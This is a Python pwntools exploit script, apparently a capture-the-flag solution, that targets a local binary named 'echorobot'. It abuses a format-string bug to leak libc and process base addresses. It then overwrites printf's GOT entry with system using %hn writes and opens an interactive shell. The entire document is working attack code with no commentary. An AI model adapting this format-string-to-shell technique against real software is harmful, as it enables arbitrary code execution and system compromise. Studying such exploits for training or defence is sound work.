from pwn import *

p = process('./echorobot')
elf = ELF('./echorobot')
libc = elf.libc

payload = '%15$p-%19$p'
p.send(payload)
leak = p.recv().decode()
__libc_start_main = int(leak.split('-')[0], 16) - 243
libc_base = __libc_start_main - libc.sym['__libc_start_main']
success('libc base = 0x%x', libc_base)
main = int(leak.split('-')[1], 16)
base = main - elf.sym['main']
success('process base address = 0x%x', base)

printfGOT = base + elf.got['printf']
print(hex(printfGOT))
system = libc_base + libc.sym['system']
system_low = int(hex(system)[-4:], 16)
system_high = int(hex(system)[-8:-4], 16)
payload = b'%' + str(system_low).encode() + b'c%10$hn' + b'%' + str(65536 - system_low + system_high).encode() + b'c%11$hn'
payload += b'a'*(32-len(payload)-3)+b'end'
payload += p64(printfGOT) + p64(printfGOT+2)
p.send(payload)
p.recvuntil('end')
sleep(0.1)
p.sendline('sh')

p.interactive()